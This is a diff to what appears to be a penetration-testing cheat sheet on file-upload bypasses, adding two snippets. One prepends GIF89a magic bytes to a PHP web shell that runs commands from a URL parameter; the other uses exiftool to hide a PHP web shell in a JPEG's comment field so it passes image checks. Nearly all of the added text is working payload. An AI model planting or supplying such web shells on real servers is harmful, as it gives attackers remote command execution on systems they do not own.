@@ -85,6 +85,20 @@ JSP: .jsp, .jspx, .jsw, .jsv, and .jspf
 Coldfusion: .cfm, .cfml, .cfc, .dbm
 ```
 
+### Use GIF89a
+```
+Basically you just add the text "GIF89a;" before you shell-code. As exemple :
+
+GIF89a;
+<?
+system($_GET['cmd']);//or you can insert your complete shell code
+?>
+```
+
+### Include in image
+```
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
+```
 
 ## Shell Stabilisation
 
